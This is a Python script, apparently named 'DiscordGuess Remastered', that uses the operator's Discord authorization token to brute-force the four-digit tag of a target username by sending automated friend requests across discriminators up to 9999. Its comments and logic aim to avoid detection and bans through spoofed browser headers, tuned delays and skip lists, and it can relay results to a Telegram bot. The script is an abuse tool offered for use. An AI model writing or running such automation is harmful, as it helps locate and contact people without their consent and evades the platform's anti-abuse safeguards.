import requests
import json
import logging
import time
import json
import os.path
from time import sleep
from colorama import init, Fore

init()

print(Fore.LIGHTGREEN_EX + """
    ____  _                          ________                    
   / __ \\(_)_____________  _________/ / ____/_  _____  __________
  / / / / / ___/ ___/ __ \\/ ___/ __  / / __/ / / / _ \\/ ___/ ___/
 / /_/ / (__  ) /__/ /_/ / /  / /_/ / /_/ / /_/ /  __(__  |__  ) 
/_____/_/____/\\___/\\____/_/   \\__,_/\\____/\\__,_/\\___/____/____/  Remastered  
                                                                 """ + Fore.RESET);

# Discord has a 10 requests/minute rate limit on the Add Friend function.
# Rate limiting delays are implemented, but use a 15 second delay to avoid suspicion.

token = input('Token: ')      # Discord Authorization Token
delay = int(input('Delay [Rec. 15]: ')) # Seconds to wait between requests
number = int(input('Number [1]: ')) # Number to check tag
req = {}
req['username'] = input('Username: ') # Username to guess
token = token.replace('"', '')

headers = { 'Host':             'discord.com',
            'User-Agent':       'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
            'Accept':           '*/*',
            'Accept-Language':  'en-GB',
            'Accept-Encoding':  'gzip, deflate, br',
            'Content-Type':     'application/json',
            'Authorization':    token,
            'Connection':       'keep-alive',
            'Referer':          'https://discord.com/channels/@me'}

# Grab necessary cookies
s = requests.Session()
s.get('https://discord.com/channels/@me')
print('Cookies -->', s.cookies.get_dict())
print()

# Telegram config
config = {
    "telegram_enable": "false",
    "bot_token": "PLACE_HERE_TOKEN",
    "bot_chatID": "PLACE_HERE_CHAT_ID",
    "send_success" : "true",
    "send_incorrect": "true",
    "send_warning": "true",
    "send_error": "true",
    "send_log_session_output": "true"
}
cread = json.dumps(config, indent = 4)
if not os.path.isfile("telegram.json"):
    with open("telegram.json", "w") as outfile:
        outfile.write(cread)
with open('telegram.json', 'r') as openfile:
    cread = json.load(openfile)
telegram_enable = cread["telegram_enable"]
send_success = cread["send_success"]
send_incorrect = cread["send_incorrect"]
send_warning = cread["send_warning"]
send_error = cread["send_error"]
send_log_session_output = cread["send_log_session_output"] # etc. Username, Delay
if telegram_enable == True or telegram_enable == "true":
    print(Fore.LIGHTGREEN_EX + "Integration with Telegram - enabled." + Fore.RESET)
elif telegram_enable != True or telegram_enable != "true":
    print(Fore.LIGHTRED_EX + "Integration with Telegram - disabled." + Fore.RESET)

# Telegram integration
def telegram_bot_sendtext(bot_message):
   bot_token = cread["bot_token"]
   bot_chatID = cread["bot_chatID"]
   send_text = 'https://api.telegram.org/bot' + bot_token + '/sendMessage?chat_id=' + bot_chatID + '&parse_mode=Markdown&text=' + bot_message
   response = requests.get(send_text)
   return response.json

# Logging setup
formatter = logging.Formatter('%(message)s') 
def setup_logger(name, log_file, level=logging.INFO):
    handler = logging.FileHandler(log_file)        
    handler.setFormatter(formatter)

    logger = logging.getLogger(name)
    logger.setLevel(level)
    logger.addHandler(handler)

    return logger

# Logging
named_tuple = time.localtime() # Time
time_string = time.strftime("%m/%d/%Y, %H:%M:%S", named_tuple) # Time
logger = setup_logger('log', 'log.txt')
logger.info('New session started - ' + time_string)
logger.info('Username: ' + req['username'])
logger.info('Number: ' + str(number))
logger.info('Delay: ' + str(delay))
if telegram_enable == "true": # Telegram
    if send_log_session_output == "true":
        telegram_bot_sendtext("New session started - " + time_string)
        telegram_bot_sendtext("Username: " + req['username'])
        telegram_bot_sendtext("Number: " + str(number))
        telegram_bot_sendtext("Delay: " + str(delay))
super_logger = setup_logger(req['username'], req['username'] + '.txt')
empty_log_write = req['username'] + '.txt'

# Empty line
def empty_line(empty_log_write):
    new_empty_line = open(empty_log_write,'a+')
    new_empty_line.write('\n')
    new_empty_line.close()

# Start bruteforce
found = False
i = number - 1 
while i<9999:
    normalSleep = True
    i += 1
    print('[',req['username'],'#',i,'] ', sep = '', end = '')
    req['discriminator'] = i
    check = str(i)
    with open(req['username'] + '.txt') as f:
        match = check in f.read().splitlines()
    if match == True: # Prevent Ban | Two friend request sent = ban
        print(Fore.LIGHTGREEN_EX + 'Ignoring because this Discord Tag in success list.' + Fore.RESET)
        print('Discord Tag: ', Fore.LIGHTBLUE_EX + req['username'], '#', i, sep = '' + Fore.RESET)
        logger.info('[' + req['username'] + '#' + str(i) + '] ' + 'Ignoring because this Discord Tag in success list.')
        if telegram_enable == "true" or telegram_enable == True: # Telegram
            if send_success == "true" or send_success == True:
                telegram_bot_sendtext("\\[" + req['username'] + "%23" + str(i) + "] " + "Ignoring because this Discord Tag in success list.")
    if match != True:
        r = s.post('https://discord.com/api/v6/users/@me/relationships', data = json.dumps(req), headers = headers)
        if r.status_code == 204:   # Friend Request sent
            print(Fore.LIGHTGREEN_EX + 'Success! Now im ignoring this Discord Tag to prevent ban. Dont delete or redacting ' + req['username'] + '.txt ' + 'file to prevent ban' + Fore.RESET)
            logger.info('[' + req['username'] + '#' + str(i) + '] ' + 'Success! Now im ignoring this Discord Tag to prevent ban. Dont delete or redacting ' + req['username'] + '.txt ' + 'file to prevent ban')
            print('Discord Tag: ', Fore.LIGHTBLUE_EX + req['username'], '#', i, sep = '' + Fore.RESET)
            super_logger.info(str(i))
            empty_line(empty_log_write)
            if telegram_enable == "true" or telegram_enable == True: # Telegram
                if send_success == "true" or send_success == True:
                    telegram_bot_sendtext("\\[" + req['username'] + "%23" + str(i) + "] " + "Success! Now im ignoring this Discord Tag to prevent ban. Dont delete or redacting " + req['username'] + ".txt " + "file to prevent ban")
            print(Fore.LIGHTGREEN_EX + 'Please, retry in 5 minutes to prevent ban.' + Fore.RESET)
            print('Waiting 5 minutes... Dont close program!')
            logger.info('[' + req['username'] + '#' + str(i) + '] ' + 'Please, retry in 5 minutes to prevent ban.')
            logger.info('[' + req['username'] + '#' + str(i) + '] ' + 'Waiting 5 minutes... Dont close program!')
            if telegram_enable == "true" or telegram_enable == True: # Telegram
                if send_success == "true" or send_success == True:
                    telegram_bot_sendtext("\\[" + req['username'] + "%23" + str(i) + "] " + "Please, retry in 5 minutes to prevent ban.")
                    telegram_bot_sendtext("\\[" + req['username'] + "%23" + str(i) + "] " + "Waiting 5 minutes... Dont close program!")
            sleep(300)
            found = True
        elif r.status_code == 400: # Incorrect Discriminator
            print('Incorrect')
            print(Fore.LIGHTRED_EX + 'This Discord Tag doesn\'t exist.' + Fore.RESET)
            logger.info('[' + req['username'] + '#' + str(i) + '] ' + 'Incorrect')
            if telegram_enable == "true" or telegram_enable == True: # Telegram
                if send_incorrect == "true" or send_incorrect == True:
                    telegram_bot_sendtext("\\[" + req['username'] + "%23" + str(i) + "] " + "Incorrect")
        elif r.status_code == 429: # Rate Limit
            i -= 1
            p = (json.loads(r.text)['retry_after'])/1000
            print(Fore.MAGENTA + 'Rate limit: retrying after', p, 'seconds.' + Fore.RESET)
            logger.warning('[' + req['username'] + '#' + str(i) + '] ' + 'Rate limit: retrying after ' + str(p) + ' seconds.')
            if telegram_enable == "true" or telegram_enable == True: # Telegram
                if send_warning == "true" or send_warning == True:
                    telegram_bot_sendtext("\\[" + req['username'] + "%23" + str(i) + "] " + "Rate limit: retrying after " + str(p) + " seconds.")
            normalSleep = False
            sleep(p)
        elif r.status_code == 401: # Invalid token
            print(Fore.LIGHTRED_EX + 'Invalid Token!')
            logger.error('[' + req['username'] + '#' + str(i) + '] ' + 'Invalid Token!')
            if telegram_enable == "true" or telegram_enable == True: # Telegram
                if send_error == "true" or send_error == True:
                    telegram_bot_sendtext("\\[" + req['username'] + "%23" + str(i) + "] " + "Invalid Token!")
            break
        else:
            print('Unknown error', r.status_code,'-->',r.text)
            logger.error('[' + req['username'] + '#' + str(i) + '] ' + 'Unknown error')
            if telegram_enable == "true" or telegram_enable == True: # Telegram
                if send_error == "true" or send_error == True:
                    telegram_bot_sendtext("\\[" + req['username'] + "%23" + str(i) + "] " + "Unknown error")
    if normalSleep:
        sleep(delay)

print()
